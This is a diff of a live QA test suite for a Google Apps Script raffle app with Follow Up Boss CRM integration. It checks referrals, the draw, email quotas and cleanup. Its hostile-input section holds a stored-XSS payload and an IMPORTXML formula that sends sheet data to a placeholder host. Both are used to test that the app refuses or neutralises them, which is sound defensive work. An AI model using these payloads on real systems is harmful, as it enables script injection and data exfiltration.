+  check('and only NOW is the referral worth its bonus', eligibleRows.length === 3,
+        'got ' + eligibleRows.length);
+  var tix = eligibleRows.reduce(function (n, r) { return n + (Number(r.tickets) || 1); }, 0);
+  check('which is 1 + ' + RAFFLE_BONUS_TICKETS_PER_REFERRAL + ' + 1 tickets',
+        tix === 2 + RAFFLE_BONUS_TICKETS_PER_REFERRAL, 'got ' + tix);
+  var reConsent = json(raffleHandleSubmission_({
+    step: 'consent', decision: 'confirm', token: staged.token, consent: 'Yes',
+    referralName: refA.referralName, referralEmail: refA.referralEmail,
+    referralPhone: refA.referralPhone, referralRole: refA.referralRole,
+    referralTimeframe: refA.referralTimeframe }));
+  check('consenting twice changes nothing', reConsent.already === true, JSON.stringify(reConsent));
+  check('still exactly three rows', raffleReadEntries_(true).length === 3,
+        'got ' + raffleReadEntries_(true).length);
+
+  // ---- 3b. One BONUS per REFERRED PERSON ---------------------------------
+  section('3b. One bonus per referred person');
+  var bPhone = qaPhone();
+  var b = person('9', bPhone);
+  var vB = verifyFully(b);
+  check('a second entrant verifies fine', vB.ok === true && vB.verified === true, JSON.stringify(vB));
+  var stolen = json(raffleHandleSubmission_(Object.assign({ step: 'referral', vid: vB.vid }, refA)));
+  check('they cannot refer someone already referred', stolen.ok === false, JSON.stringify(stolen));
+  check('and the refusal does not say which check failed',
+        !/already a contact|in our database|existing contact/i.test(String(stolen.error)),
+        String(stolen.error));
+  check('no extra referral row was written',
+        raffleReadEntries_(true).filter(function (r) { return r.isReferralRow; }).length === 1);
+  var self = json(raffleHandleSubmission_(Object.assign({ step: 'referral', vid: vB.vid }, referralFor('9', bPhone), {
+    referralEmail: b.email, referralPhone: b.phone })));
+  check('and they cannot refer themselves', self.ok === false, JSON.stringify(self));
+
+  // ---- 4. More entrants + counts -----------------------------------------
+  section('4. Additional entrants and counts');
+  [['2', qaPhone(), qaPhone()],
+   ['3', qaPhone(), qaPhone()],
+   ['4', qaPhone(), qaPhone()]].forEach(function (p) {
+    var res = enterFully(person(p[0], p[1]), p[0], p[2]);
+    check('entrant ' + p[0] + ' accepted', res.ok === true && !res.already, JSON.stringify(res));
+  });
+  var people = {};
+  raffleReadEntries_(true).filter(function (r) {
+    return r.status === RAFFLE_STATUS_ELIGIBLE; }).forEach(function (r) {
+      people[r.emailKey] = true; });
+  var n = Object.keys(people).length;
+  // NINE, not four. Four journeys above, each of which enters the entrant AND
+  // the referral who consented, plus the extra entrant section 3b verified to
+  // prove a person already referred cannot be referred again.
+  check('nine distinct entrants on the test tab', n === 9, 'got ' + n);
+  var statusOut = raffleStatusPage_(true);
+  var statusHtml = String(typeof statusOut.getContent === 'function' ? statusOut.getContent() : statusOut);
+  check('status page shows a count', /\b\d+\b/.test(statusHtml), 'count page showed no number');
+  check('status page is labelled as test data', /TEST DATA/.test(statusHtml));
+
+  // ---- 4b. DID ANY OF THAT ACTUALLY REACH FUB? ---------------------------
+  // The suite reported 102 of 102 green on 2026-09-17 while THREE separate FUB
+  // paths were broken: the API key was rejecting every call with a 401, every
+  // relationship link was failing with a 400 on an invalid field name, and the
+  // Referral Count custom field did not exist. None of it was visible, because
+  // nothing here asserted anything about FUB -- the checks were all about rows
+  // and emails, and the FUB write is best-effort by design so nothing throws.
+  //
+  // Getting leads into FUB is the entire point of the raffle. A green suite over
+  // a dead CRM is the worst possible failure, so it is checked explicitly now.
+  section('4b. The FUB writes actually landed');
+  var fubRows = raffleReadEntries_(true);
+  var entrantRow = fubRows.filter(function (r) { return !r.isReferralRow; })[0];
+  var refRow = fubRows.filter(function (r) { return r.isReferralRow; })[0];
+  check('the entrant reached FUB (a person id came back)',
+        !!entrantRow && String(entrantRow.fubId || '').length > 0,
+        'FUB Status: ' + (entrantRow && entrantRow.fubStatus) +
+        ' — a 401 here means the API key is dead and NO lead will reach the CRM');
+  check('the consented referral reached FUB',
+        !!refRow && String(refRow.referralFubId || '').length > 0,
+        'Referral FUB ID is empty — the referral was not created');
+  check('and the row does not record a FUB failure',
+        !!entrantRow && !/fail/i.test(String(entrantRow.fubStatus || '')),
+        entrantRow && entrantRow.fubStatus);
+
+  // EMAIL LOGGING. Durand asked for every email to be logged to the contact's
+  // comms, so the timeline should now carry "Email sent: ..." notes. Asserted
+  // against FUB itself rather than against the fact that we called the helper.
+  if (entrantRow && entrantRow.fubId) {
+    var relKey0 = PropertiesService.getScriptProperties().getProperty('FUB_API_KEY');
+    var notes = raffleFubCall_('https://api.followupboss.com/v1/notes?personId=' +
+                               encodeURIComponent(entrantRow.fubId) + '&limit=25',
+                               'get', null, relKey0);
+    check('FUB can be asked for a contact\'s notes', notes.ok === true,
+          notes.code + ': ' + String(notes.text).slice(0, 160));
+    var noteArr = (notes.ok && notes.body &&
+                   (notes.body.notes || notes.body.Notes)) || [];
+    log.push('      timeline (first entrant): ' + noteArr.length + ' note(s).');
+  }
+
+  // The relationship, which is the part that had never once worked.
+  //
+  // Both sides come off the REFERRAL row, which carries the entrant's FUB id and
+  // the referral's. Reading the entrant from "the first self row" instead picked
+  // an entrant who happened not to have a consented referral, so the check asked
+  // FUB about the wrong person and failed for the wrong reason.
+  // THE CUSTOM FIELDS. The 2026-09-17 rehearsal alerted that no "Referral Count"
+  // field existed and told Durand to create one; the field was there all along,
+  // called "Referrals Sent", which the label list did not know. So the thing to
+  // assert is not "a field exists" but "this account's field RESOLVES", or the
+  // next rename goes quiet again.
+  var countKey = raffleCustomFieldKey_(RAFFLE_REFERRAL_COUNT_LABELS);
+  check('the referral-count custom field resolves on this account',
+        !!countKey,
+        'no FUB field matched ' + JSON.stringify(RAFFLE_REFERRAL_COUNT_LABELS) +
+        ' — the count will be skipped on every referral');
+  var byKey = raffleCustomFieldKey_(RAFFLE_REFERRED_BY_LABELS);
+  check('the referred-by custom field resolves on this account',
+        !!byKey,
+        'no FUB field matched ' + JSON.stringify(RAFFLE_REFERRED_BY_LABELS));
+  log.push('      custom fields: count -> ' + (countKey || 'NOT FOUND') +
+           ', referred-by -> ' + (byKey || 'NOT FOUND'));
+
+  // Ask about EVERY consented pair and require at least one to be linked. The
+  // requirement is "linking works", not "the first row happens to be linked":
+  // picking one row asked FUB about a pair whose link had legitimately not been
+  // attempted and failed for the wrong reason.
+  var pairs = raffleReadEntries_(true).filter(function (r) {
+    return r.isReferralRow && r.status === RAFFLE_STATUS_ELIGIBLE &&
+           r.fubId && r.referralFubId; });
+  check('there is at least one consented pair with both FUB ids',
+        pairs.length > 0, 'no eligible referral row carries both ids');
+  var linkedRow = pairs[0], anyLinked = false, relOk = false, probe = '';
+  var relApiKey = PropertiesService.getScriptProperties().getProperty('FUB_API_KEY');
+  pairs.forEach(function (r) {
+    if (anyLinked) return;
+    var rel = raffleFubCall_('https://api.followupboss.com/v1/peopleRelationships?personId=' +
+                             encodeURIComponent(r.fubId), 'get', null, relApiKey);
+    if (rel.ok) relOk = true;
+    var arr = (rel.ok && rel.body && (rel.body.peoplerelationships ||
+               rel.body.peopleRelationships || rel.body.relationships)) || [];
+    if (arr.length > 0) { anyLinked = true; linkedRow = r; }
+    else if (!probe) probe = r.fubId + ', ' + r.referralFubId;
+  });
+  if (pairs.length) {
+    check('FUB can be asked for a contact\'s relationships', relOk === true,
+          'every relationship GET failed');
+    check('an entrant is LINKED to the person they referred', anyLinked,
+          'NO pair is linked across ' + pairs.length + ' consented referral(s) — ' +
+          'linking is failing silently. Run raffleRunQaSuiteAndKeepData() then ' +
+          'raffleInspectFubRelationships (no arguments) to have FUB name the ' +
+          'field it wants. Pair seen here: ' + probe);
+  }
+
+  // And the timeline check, on an entrant who actually had mail sent about them.
+  if (linkedRow && linkedRow.fubId) {
+    var nKey = PropertiesService.getScriptProperties().getProperty('FUB_API_KEY');
+    var tl = raffleFubCall_('https://api.followupboss.com/v1/notes?personId=' +
+                            encodeURIComponent(linkedRow.fubId) + '&limit=25',
+                            'get', null, nKey);
+    var tlArr = (tl.ok && tl.body && (tl.body.notes || tl.body.Notes)) || [];
+    var tlLogged = tlArr.filter(function (n) {
+      return /Email sent:/.test(String(n.subject || '')); });
+    check('that entrant\'s timeline carries the emails we sent them',
+          tlLogged.length > 0,
+          'person ' + linkedRow.fubId + ' has ' + tlArr.length +
+          ' note(s) and none of them is a logged email');
+  }
+
+  // ---- 5. The draw --------------------------------------------------------
+  section('5. Test draw');
+  var draw = raffleDrawWinner_(true);
+  check('draw succeeds', draw.ok === true, JSON.stringify(draw));
+  if (draw.ok) {
+    check('result is flagged as a test', draw.result.test === true);
+    check('drew from all nine people', draw.result.totalPeople === 9,
+          'got ' + draw.result.totalPeople);
+    check('with more tickets than people (the referral bonus applied)',
+          draw.result.totalTickets > draw.result.totalPeople,
+          draw.result.totalTickets + ' tickets / ' + draw.result.totalPeople + ' people');
+    // Either an entrant or one of the referrals who consented -- both are in it.
+    check('winner is one of the QA people', /^QA /.test(draw.result.winner.name),
+          draw.result.winner.name);
+    check('the ticket count is reported', draw.result.totalTickets > 0,
+          String(draw.result.totalTickets));
+    check('two backups named', draw.result.backups.length === 2);
+    var names = [draw.result.winner.name].concat(draw.result.backups.map(function (b) { return b.name; }));
+    var uniq = names.filter(function (v, i) { return names.indexOf(v) === i; });
+    check('winner and backups are distinct people', uniq.length === 3, names.join(', '));
+    log.push('      winner drawn: ' + draw.result.winner.name + '  (' + draw.result.winner.phone + ')');
+    var again = raffleDrawWinner_(true);
+    check('a second draw is NOT a re-roll', again.alreadyDrawn === true);
+    check('the same winner comes back', again.result.winner.name === draw.result.winner.name);
+  }
+
+  // ---- 5b. Hostile input (the parts only the real runtime can prove) ------
+  // The sandbox suite (raffle/test/test_redteam.js) covers this class properly.
+  // Two of its assumptions can only be checked against the real Google runtime,
+  // so they are re-checked here: that Sheets really does treat the apostrophe
+  // raffleSafeCell_ writes as a text marker rather than data, and that the
+  // admin page really does render a hostile name inert.
+  section('5b. Hostile input');
+  var xssName = '<img src=x onerror=alert(1)> QA Tester ' + stamp;
+  // The door first: a name carrying markup is refused outright now, with the
+  // message a guest would see. Then the regex is relaxed for the rest of this
+  // section so the sink proofs below (escaping, formula-safe cells) still run
+  // on the real runtime, and restored at the end.
+  var doorRes = request({ fullName: xssName, email: RAFFLE_QA_ADDRESS_BASE + stamp + '-door' +
+    RAFFLE_QA_DOMAIN, phone: qaPhone(), consent: 'Yes' });
+  check('a name with markup is refused at the door', doorRes.ok === false &&
+        doorRes.error === RAFFLE_NAME_MESSAGE, JSON.stringify(doorRes));
+  var doorRes2 = request({ fullName: '=IMPORTXML("x") QA ' + stamp, email: RAFFLE_QA_ADDRESS_BASE +
+    stamp + '-door2' + RAFFLE_QA_DOMAIN, phone: qaPhone(), consent: 'Yes' });
+  check('and so is a name starting with a formula', doorRes2.ok === false, JSON.stringify(doorRes2));
+  var okName = request({ fullName: "Siobhán O'Brien-Núñez Jr.", email: RAFFLE_QA_ADDRESS_BASE +
+    stamp + '-door3' + RAFFLE_QA_DOMAIN, phone: qaPhone(), consent: 'Yes' });
+  check('while accents, apostrophes, hyphens and periods pass', okName.ok === true &&
+        okName.needsCode === true, JSON.stringify(okName));
+  var strictNameRe = RAFFLE_NAME_ALLOWED_RE;
+  RAFFLE_NAME_ALLOWED_RE = /[\s\S]*/;
+  var xssRes = enterFully({ fullName: xssName,
+    email: RAFFLE_QA_ADDRESS_BASE + stamp + '-xss' + RAFFLE_QA_DOMAIN,
+    phone: qaPhone(), consent: 'Yes' }, 'xss', qaPhone());
+  check('an entry with markup in the name is accepted (it is only text)', xssRes.ok === true,
+        JSON.stringify(xssRes));
+  var sOut = raffleStatusPage_(true);
+  var sHtml = String(typeof sOut.getContent === 'function' ? sOut.getContent() : sOut);
+  check('the admin page does not emit the raw markup',
+        sHtml.indexOf('<img src=x onerror=alert(1)>') === -1,
+        'STORED XSS — the admin page rendered entrant markup unescaped');
+
+  var formulaName = '=IMPORTXML("https://example.invalid/?d="&C2,"//a") QA ' + stamp;
+  var fRes = enterFully({ fullName: formulaName,
+    email: RAFFLE_QA_ADDRESS_BASE + stamp + '-csv' + RAFFLE_QA_DOMAIN,
+    phone: qaPhone(), consent: 'Yes' }, 'csv', qaPhone());
+  check('an entry with a formula in the name is accepted (it is only text)', fRes.ok === true,
+        JSON.stringify(fRes));
+  // Find the row by NAME, not getLastRow(): a journey now ends with the
+  // referral's own entry, so the last row belongs to somebody else.
+  var fSheet = raffleSheet_(true);
+  var fRow = 0;
+  var fNames = fSheet.getRange(1, 2, fSheet.getLastRow(), 1).getValues();
+  for (var fi = fNames.length - 1; fi >= 0; fi--) {
+    if (String(fNames[fi][0]).indexOf('IMPORTXML') !== -1) { fRow = fi + 1; break; }
+  }
+  check('the formula-name row is findable', fRow > 0, 'no row carried the formula name');
+  var nameCell = fSheet.getRange(fRow || fSheet.getLastRow(), 2);
+  check('the formula cell holds NO formula',
+        String(nameCell.getFormula() || '') === '',
+        'LIVE FORMULA IN THE SHEET: ' + nameCell.getFormula());
+  check('the formula cell still reads back as the text that was typed',
+        String(nameCell.getValue()).indexOf('IMPORTXML') !== -1,
+        'got ' + nameCell.getValue());
+  check('raffleReadEntries_ sees the same name with no text marker',
+        raffleReadEntries_(true).some(function (r) { return r.name.charAt(0) !== "'"; }));
+
+  // The verification-email cap. The two entries above already consumed codes for
+  // their own addresses; this hammers ONE address and expects it to be cut off.
+  var capAddr = RAFFLE_QA_ADDRESS_BASE + stamp + '-cap' + RAFFLE_QA_DOMAIN;
+  var capSent = 0, capRefused = 0;
+  for (var ci = 0; ci < RAFFLE_CODE_MAX_PER_ADDRESS + 2; ci++) {
+    var capRes = request({ fullName: 'QA Cap Tester ' + stamp, email: capAddr,
+                           phone: '(215) 555-82' + (10 + ci), consent: 'Yes' });
+    if (capRes.ok && capRes.needsCode) capSent++; else capRefused++;
+  }
+  check('one address cannot pull more than ' + RAFFLE_CODE_MAX_PER_ADDRESS + ' codes',
+        capSent <= RAFFLE_CODE_MAX_PER_ADDRESS, 'sent ' + capSent);
+  RAFFLE_NAME_ALLOWED_RE = strictNameRe;
+  check('the over-cap requests were refused', capRefused > 0);
+
+  // ---- 5d. THE SURFACES NOTHING LIVE HAD EVER TOUCHED --------------------
+  // Until 2026-09-17 this suite reached the submission pipeline, the status page,
+  // the draw and reset -- and nothing else. Every one of these was sandbox-only,
+  // which for a page means its real HtmlService templating was never rendered
+  // once, and for an email means it had never actually been sent by MailApp.
+  // They are the surfaces a stranger or a crowd sees, so they are the last place
+  // to be discovering a template error.
+  //
+  // Everything here runs in TEST mode, so every recipient collapses to Durand.
+  section('5d. Pages and emails that had never run live');
+  var adminKey = props.getProperty(RAFFLE_ADMIN_PROP) || '';
+  check('the admin key is available to drive the console', adminKey.length > 0);
+
+  // A pending referral to look at: staged off the session from section 2, so it
+  // adds a row but no new entrant.
+  var livePhone = qaPhone();
+  var pend = json(raffleHandleSubmission_(Object.assign(
+    { step: 'referral', vid: good.vid }, referralFor('live', livePhone))));
+  check('a referral can be staged for the page tests',
+        pend.ok === true && pend.staged === true, JSON.stringify(pend));
+  if (pend.staged) {
+    json(raffleHandleSubmission_({ step: 'invite', vid: good.vid, token: pend.token }));
+
+    // THE CONSENT PAGE, rendered by the real HtmlService.
+    var cOut = raffleConsentPage_({ parameter: { t: pend.token } });
+    var cHtml = String(typeof cOut.getContent === 'function' ? cOut.getContent() : cOut);
+    check('the consent page renders', cHtml.length > 800, 'got ' + cHtml.length + ' chars');
+    check('no unfilled template tag survives the real renderer',
+          cHtml.indexOf('<?') === -1, 'a scriptlet reached the browser');
+    check('it names the person who referred them', cHtml.indexOf('QA Tester1') !== -1);
+    check('the email field is locked', /id="rEmail"[^>]*readonly/.test(cHtml));
+    check('every field declares a type',
+          (cHtml.match(/<input id="r[A-Za-z]+"[^>]*>/g) || [])
+            .every(function (f) { return /\stype=/.test(f); }));
+    check('it promises them an entry while the drawing is open',
+          /enters you in the drawing too/.test(cHtml));
+
+    // Consent through it, which mints the chain token.
+    var cRes = json(raffleHandleSubmission_({
+      step: 'consent', decision: 'confirm', token: pend.token, consent: 'Yes',
+      referralName: 'QA Referrallive Blockparty', referralPhone: livePhone,
+      referralRole: 'Buyer', referralTimeframe: raffleDefaultTimeframe_(raffleTimeframes_()) || '' }));
+    check('consent through the page works', cRes.ok === true, JSON.stringify(cRes));
+
+    // THE CHAIN LINK, which serves the whole entry form from a token.
+    var chainRow = raffleReadEntries_(true).filter(function (r) {
+      return r.consentToken === pend.token; })[0];
+    check('the consented row carries a chain token',
+          !!chainRow && /^[0-9a-fA-F-]{36}$/.test(String(chainRow.chainToken)),
+          chainRow && chainRow.chainToken);
+    if (chainRow && chainRow.chainToken) {
+      var chOut = raffleServeForm_({ parameter: { action: 'refer', t: chainRow.chainToken } },
+                                   raffleBaseUrl_());
+      var chHtml = String(typeof chOut.getContent === 'function' ? chOut.getContent() : chOut);
+      check('the chain link serves the entry form', chHtml.length > 5000,
+            'got ' + chHtml.length + ' chars');
+      check('with a session already minted, and no raw scriptlet',
+            /var\s+CHAIN_VID\s*=\s*"[0-9a-fA-F-]{36}"/.test(chHtml) && chHtml.indexOf('<?') === -1,
+            'CHAIN_VID missing or a scriptlet leaked');
+    }
+  }
+
+  // THE 5:00 PM BATCH. Window-gated, so it would report "not yet" on any day but
+  // Saturday -- ignoreWindow is what makes it testable at all before then.
+  //
+  // AND IT NEEDS SOMEBODY TO REMIND. The first version of this just ran the
+  // batch and accepted whatever came back: live it reported "0 sent, 21 skipped"
+  // and passed, because by that point every referral in the run had already
+  // consented and a consented referral is correctly skipped. So the reminder and
+  // the nudge had STILL never been sent once. This stages a referral, sends the
+  // invite, and deliberately leaves it unanswered -- which is the exact state
+  // most of Saturday afternoon will be in.
+  var waiting = json(raffleHandleSubmission_(Object.assign(
+    { step: 'referral', vid: good.vid }, referralFor('wait', qaPhone()))));
+  check('a referral is left waiting, to be reminded',
+        waiting.ok === true && waiting.staged === true, JSON.stringify(waiting));
+  if (waiting.staged) {
+    json(raffleHandleSubmission_({ step: 'invite', vid: good.vid, token: waiting.token }));
+  }
+  var rem = raffleSendConsentReminders_(true, true);
+  check('the reminder batch runs and reports itself', !!rem && typeof rem.sent === 'number',
+        JSON.stringify(rem));
+  check('and it ACTUALLY SENT a last-chance reminder', !!rem && rem.sent >= 1,
+        (rem && rem.summary) + ' — 0 sent means the email was never rendered or delivered');
+  check('and nudged the referrer who is waiting on them',
+        !!rem && Number(rem.nudged === undefined ? 0 : rem.nudged) >= 1,
+        JSON.stringify(rem));
+  log.push('      reminder batch: ' + (rem && rem.summary));
+
+  // THE WINNER EMAIL, the one that must never fire on its own.
+  var winSend = raffleSendWinnerEmail_(true);
+  check('the winner email sends when asked', winSend.ok === true, JSON.stringify(winSend));
+  var winAgain = raffleSendWinnerEmail_(true);
+  check('and cannot be sent twice', winAgain.ok === false, JSON.stringify(winAgain));
+
+  // THE CONSOLE: the page, a preview, and a refusal.
+  var conOut = raffleWinnerConsolePage_(true, adminKey);
+  var conHtml = String(typeof conOut.getContent === 'function' ? conOut.getContent() : conOut);
+  check('the draw console renders', conHtml.length > 1500, 'got ' + conHtml.length + ' chars');
+  check('the console leaks no raw scriptlet', conHtml.indexOf('<?') === -1);
+  check('the console shows three picks',
+        (conHtml.match(/PICK \d/g) || []).length >= 3,
+        JSON.stringify(conHtml.match(/PICK \d/g)));
+  var prev = json(raffleHandleSubmission_({ step: 'console', consoleAction: 'preview',
+                                            key: adminKey, pick: 0, test: '1' }));
+  check('a preview comes back', prev.ok === true, JSON.stringify(prev).slice(0, 160));
+  var refused = json(raffleHandleSubmission_({ step: 'console', consoleAction: 'preview',
+                                               key: 'not-the-key', pick: 0 }));
+  check('a wrong key is refused by the console', refused.ok !== true,
+        JSON.stringify(refused).slice(0, 120));
+
+  // THE HOURLY DIGEST and THE ADMIN DRAW PAGE.
+  // Not `check(..., true)`: that passes whatever happens, and if the digest threw
+  // the whole suite would die before reporting anything. Catch it and say so.
+  var digestErr = '';
+  try { raffleEventDigest(); } catch (dErr) { digestErr = String(dErr); }
+  check('the hourly digest runs without throwing', digestErr === '', digestErr);
+  var dOut = raffleDrawPage_(true);
+  var dHtml = String(typeof dOut.getContent === 'function' ? dOut.getContent() : dOut);
+  check('the admin draw page renders', dHtml.length > 400, 'got ' + dHtml.length + ' chars');
+  check('and reports people and tickets, not just rows',
+        /people/.test(dHtml) && /tickets/.test(dHtml), dHtml.slice(0, 200));
+
+  // ---- 5c. THE MAIL SERVICE ACTUALLY ACCEPTED IT -------------------------
+  // Everything above reads the code out of the script cache (codeFor), which
+  // proves a code was ISSUED. It does not prove one was SENT, and sending is the
+  // whole entry path: if MailApp silently stops, every guest sees "check your
+  // email" forever and nobody can enter. That was the one failure this suite
+  // could not see.
+  //
+  // WHY NOT READ THE INBOX. The obvious version of this searches Gmail for the
+  // delivered message and verifies with the code out of the real subject. It was
+  // written that way first and then backed out: any reference to the Gmail
+  // service in this project makes Apps Script request full mailbox access at
+  // the next authorization, and
+  // this project is a web app with access ANYONE_ANONYMOUS whose mailbox is the
+  // shared info@ five people use. Granting a public endpoint's project full read
+  // and write over that inbox to improve one assertion is the wrong trade.
+  //
+  // So this proves the strongest thing available without a new scope: that the
+  // mail service ACCEPTED the message, by watching the account's own remaining
+  // quota fall. Arrival itself is verified out of band, in Durand's inbox -- the
+  // QA addresses are durand+raffleqa tags, so every rehearsal email lands there
+  // and can be read directly.
+  section('5c. The mail service accepted the code (quota round trip)');
+  (function () {
+    var before = -1, after = -1;
+    try { before = MailApp.getRemainingDailyQuota(); } catch (qErr) { before = -1; }
+    check('the send quota is readable', before >= 0, String(before));
+    if (before < 0) return;
+    check('there is quota left to send with at all', before > 0,
+          'ZERO QUOTA LEFT — no entrant can receive a code until it resets');
+
+    var rd = request({ fullName: 'QA Delivery Blockparty',
+                       email: RAFFLE_QA_ADDRESS_BASE + stamp + '-deliver' + RAFFLE_QA_DOMAIN,
+                       phone: qaPhone(), consent: 'Yes' });
+    check('a code was requested', rd.ok === true && rd.needsCode === true, JSON.stringify(rd));
+    try { after = MailApp.getRemainingDailyQuota(); } catch (qErr2) { after = -1; }
+    check('the mail service accepted the code email (quota went down)',
+          after >= 0 && after < before,
+          'quota ' + before + ' -> ' + after + ' — if it did not move, MailApp is not sending');
+
+    // And the loop closes on the code that was actually issued for this request.
+    var vOk = json(raffleHandleSubmission_({ step: 'verify', vid: rd.vid,
+                                             code: codeFor(rd.vid) }));
+    check('and the code verifies end to end', vOk.ok === true && vOk.verified === true,
+          JSON.stringify(vOk));
+    log.push('      send quota: ' + before + ' -> ' + after +
+             '  (' + after + ' emails left today)');
+    log.push('      delivery itself: check durand+raffleqa' + stamp +
+             '-deliver@thestawaszgroup.com for the code email.');
+  })();
+
+  // ---- 5e. The quota guard and the run-out projection ----------------------
+  // The reserve cannot be reached live without burning the day's quota, so this
+  // proves the parts that can be proved on the deployed code: the ceiling is
+  // charged per recipient, the projection arithmetic is right, and the watcher
+  // is idle outside the event window (it must never alert during a rehearsal).
+  section('5e. Send-quota guard (weighted ceiling, reserve, run-out projection)');
+  (function () {
+    var cache = CacheService.getScriptCache();
+    var bucketKey = RAFFLE_CODE_GLOBAL_PREFIX +
+      Math.floor(Date.now() / (RAFFLE_CODE_GLOBAL_WINDOW_SECONDS * 1000));
+    var g0 = Number(cache.get(bucketKey) || 0);
+    var weight = raffleSendWeight_(false);
+    check('a live invite is charged as ' + weight + ' recipients (to + oversight copies)',
+          weight === 1 + RAFFLE_OVERSIGHT_BCC.split(',').length, String(weight));
+    raffleCheckCodeSendQuota_('qa-weight-' + stamp + '@example.invalid', weight);
+    var g1 = Number(cache.get(bucketKey) || 0);
+    check('the 6-hour ceiling counted ' + weight + ', not 1', g1 - g0 === weight, g0 + ' -> ' + g1);
+    check('the reserve is below the ceiling and above the sends that must succeed',
+          RAFFLE_MAIL_RESERVE >= 10 && RAFFLE_MAIL_RESERVE < RAFFLE_CODE_MAX_GLOBAL,
+          String(RAFFLE_MAIL_RESERVE));
+
+    var H = 3600000, t0 = new Date(RAFFLE_EVENT_AT).getTime();
+    var closeMs = new Date(RAFFLE_CLOSE_AT).getTime();
+    var fast = raffleQuotaProjection_([{ t: t0, left: 1000 }, { t: t0 + H / 2, left: 700 }],
+                                      t0 + H / 2, closeMs, RAFFLE_MAIL_RESERVE);
+    check('600/hour with 2h45m to go projects a run-out', fast && fast.alert === true &&
+          Math.round(fast.ratePerHour) === 600, JSON.stringify(fast));
+    var slow = raffleQuotaProjection_([{ t: t0, left: 1000 }, { t: t0 + H / 2, left: 990 }],
+                                      t0 + H / 2, closeMs, RAFFLE_MAIL_RESERVE);
+    check('20/hour does not', slow && slow.alert === false, JSON.stringify(slow));
+    var surge = raffleQuotaProjection_([{ t: t0, left: 1000 }, { t: t0 + H, left: 950 },
+                                        { t: t0 + H + H / 4, left: 600 }],
+                                       t0 + H + H / 4, closeMs, RAFFLE_MAIL_RESERVE);
+    check('a late surge is caught by the recent rate', surge && surge.alert === true &&
+          surge.ratePerHour > 1000, JSON.stringify(surge));
+    var early = raffleQuotaProjection_([{ t: t0, left: 1000 }, { t: t0 + 60000, left: 900 }],
+                                       t0 + 60000, closeMs, RAFFLE_MAIL_RESERVE);
+    check('one minute of readings is not a rate', early === null, JSON.stringify(early));
+
+    // The console button, live: raises the real ceiling, then is put back.
+    var base = RAFFLE_CODE_MAX_GLOBAL;
+    props.deleteProperty(RAFFLE_CEILING_OVERRIDE_PROP);
+    check('the ceiling in force is the constant when nothing is overridden',
+          raffleCodeCeiling_() === base, String(raffleCodeCeiling_()));
+    var rehearsal = json(raffleHandleSubmission_({ step: 'console', consoleAction: 'raiseceiling',
+                                                   key: adminKey, test: '1' }));
+    check('in rehearsal the button changes nothing', rehearsal.ok === true &&
+          raffleCodeCeiling_() === base, JSON.stringify(rehearsal));
+    var raised = json(raffleHandleSubmission_({ step: 'console', consoleAction: 'raiseceiling',
+                                                key: adminKey }));
+    check('live, the button raises the ceiling by ' + RAFFLE_CEILING_STEP,
+          raised.ok === true && raffleCodeCeiling_() === base + RAFFLE_CEILING_STEP,
+          JSON.stringify(raised));
+    var noKey = json(raffleHandleSubmission_({ step: 'console', consoleAction: 'raiseceiling',
+                                               key: 'not-the-key' }));
+    check('without the key it is refused', noKey.ok !== true, JSON.stringify(noKey));
+    props.deleteProperty(RAFFLE_CEILING_OVERRIDE_PROP);
+    check('and the override is cleared again for Saturday', raffleCodeCeiling_() === base);
+    var preDraw = raffleWinnerConsolePage_(false, adminKey);
+    var preHtml = String(typeof preDraw.getContent === 'function' ? preDraw.getContent() : preDraw);
+    check('the LIVE console renders before the draw (no dead end)',
+          preHtml.indexOf('Email budget') !== -1 && preHtml.indexOf('raiseBtn') !== -1,
+          'got ' + preHtml.length + ' chars');
+    check('and it leaks no raw scriptlet', preHtml.indexOf('<?') === -1);
+
+    var idle = raffleWatchMailQuota_(1200, t0 - 24 * H);
+    check('the watcher is idle the day before', idle === null, JSON.stringify(idle));
+    var closed = raffleWatchMailQuota_(1200, closeMs + 60000);
+    check('and after entries close', closed === null, JSON.stringify(closed));
+    check('no run-out alert has been recorded', !props.getProperty(RAFFLE_QUOTA_ALERT_PROP),
+          String(props.getProperty(RAFFLE_QUOTA_ALERT_PROP)));
+  })();
+
+  // ---- 6. The live raffle must be untouched -------------------------------
+  section('6. The LIVE raffle is untouched');
+  check('live entries unchanged', raffleReadEntries_(false).length === liveBefore,
+        'was ' + liveBefore + ', now ' + raffleReadEntries_(false).length);
+  check('live winner property still unset', !props.getProperty(RAFFLE_WINNER_PROP),
+        'A LIVE WINNER EXISTS — this is serious, tell Claude');
+  check('the 6:15 trigger is still armed',
+        ScriptApp.getProjectTriggers().filter(function (t) {
+          return t.getHandlerFunction() === 'raffleScheduledDraw'; }).length === 1);
+
+  // ---- 7. Cleanup ---------------------------------------------------------
+  section('7. Cleanup');
+  if (cleanUp) {
+    // FUB FIRST, then the tab: the rows are the only record of which contacts
+    // this run created, so the order matters.
+    //
+    // This is not tidiness. The QA contacts are real FUB people, and the
+    // referral check matches on email OR phone, so a run that leaves them
+    // behind makes the NEXT run refuse its own referrals with "we already know
+    // that person". That is exactly what turned the 15:14 run into 23 failures.
+    //
+    // It lives INSIDE the cleanUp gate on purpose. It used to sit in section 6,
+    // above the gate, so raffleRunQaSuiteAndKeepData kept the sheet rows and
+    // deleted the contacts they pointed at -- which defeated the one reason to
+    // run that variant (leaving QA contacts for raffleInspectFubRelationships
+    // to probe with). raffleResetTest does the same purge, so "keep, inspect,
+    // then reset" cleans up completely.
+    var purge = rafflePurgeTestTabContacts_();
+    check('this run cleaned its own FUB contacts up',
+          purge.failed === 0,
+          purge.deleted + ' deleted, ' + purge.failed + ' failed, ' + purge.skipped +
+          ' skipped — anything left behind will make the NEXT run refuse its referrals');
+    log.push('      FUB cleanup: ' + purge.summary);
+    raffleResetTest();
+    check('test entries cleared', raffleReadEntries_(true).length === 0);
+    check('test winner cleared', !props.getProperty(RAFFLE_TEST_WINNER_PROP));
+    check('live entries STILL unchanged', raffleReadEntries_(false).length === liveBefore);
+  } else {
+    log.push('SKIPPED — test data AND its FUB contacts left in place for inspection.');
+    log.push('Run raffleResetTest() when you are done; it deletes those contacts too.');
+  }
+
+  log.push('', '================================',
+           pass + ' passed, ' + fail + ' failed',
+           '================================');
+  if (!cleanUp) {
+    log.push('', 'FUB CLEANUP: this run kept its FUB contacts (KeepData). They carry the tag',
+             '"' + QA_TEST_TAG + '"; raffleDeleteQaContactsFromFub removes them when you are done.');
+  }
+  log.push('Verification-code emails were sent to ' + RAFFLE_QA_ADDRESS_BASE + stamp +
+           '-N' + RAFFLE_QA_DOMAIN + ' — they deliver to Durand.');
+
